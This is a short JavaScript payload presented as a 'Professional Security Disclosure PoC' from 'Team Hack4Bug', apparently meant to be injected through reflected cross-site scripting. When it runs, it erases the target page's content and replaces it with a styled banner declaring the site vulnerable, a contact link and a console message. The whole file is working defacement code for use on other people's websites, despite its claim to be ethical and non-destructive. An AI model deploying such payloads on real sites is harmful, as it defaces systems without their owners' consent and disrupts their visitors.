
// Professional Security Disclosure PoC
(function() {
    // 1. Clear the existing page styles and content
    document.documentElement.innerHTML = '';
    
    // 2. Set a modern, professional background
    document.body.style.backgroundColor = '#0a0a0a';
    document.body.style.color = '#ffffff';
    document.body.style.fontFamily = 'Segoe UI, Tahoma, Geneva, Verdana, sans-serif';
    document.body.style.display = 'flex';
    document.body.style.justifyContent = 'center';
    document.body.style.alignItems = 'center';
    document.body.style.height = '100vh';
    document.body.style.margin = '0';
    document.body.style.textAlign = 'center';

    // 3. Create a Container for the message
    const container = document.createElement('div');
    container.style.padding = '40px';
    container.style.border = '1px solid #333';
    container.style.borderRadius = '15px';
    container.style.backgroundColor = '#111';
    container.style.boxShadow = '0 10px 30px rgba(0,0,0,0.5)';
    container.style.maxWidth = '600px';

    // 4. Content
    container.innerHTML = `
        <h1 style="color: #ff3e3e; font-size: 2.5rem; margin-bottom: 10px;">Security Alert</h1>
        <p style="font-size: 1.2rem; color: #ccc;">This website is currently vulnerable to <b>Reflected XSS</b>.</p>
        <hr style="border: 0; border-top: 1px solid #333; margin: 20px 0;">
        <p style="font-size: 1rem; line-height: 1.6;">
            We are <b>Team Hack4Bug</b>. This is a non-destructive demonstration to help you improve your security. 
            An attacker could use this vulnerability to steal user data or redirect your visitors.
        </p>
        <div style="margin-top: 30px;">
            <p style="color: #00d4ff; font-weight: bold;">STATUS: VULNERABLE</p>
            <p style="font-size: 0.9rem;">Please contact us to resolve this bug or consult your security team.</p>
            <a href="mailto:your-email@example.com" style="display: inline-block; margin-top: 15px; padding: 10px 20px; background-color: #00d4ff; color: #000; text-decoration: none; border-radius: 5px; font-weight: bold;">Contact Researcher</a>
        </div>
        <p style="margin-top: 40px; font-size: 0.8rem; color: #555;">&copy; 2024 Team Hack4Bug | Ethical Security Research</p>
    `;

    document.body.appendChild(container);

    // 5. Console Log for the Security Team
    console.log("%c[!] XSS Vulnerability Confirmed by Hack4Bug", "color: red; font-size: 20px; font-weight: bold;");
    console.log("Location: " + window.location.href);
})();
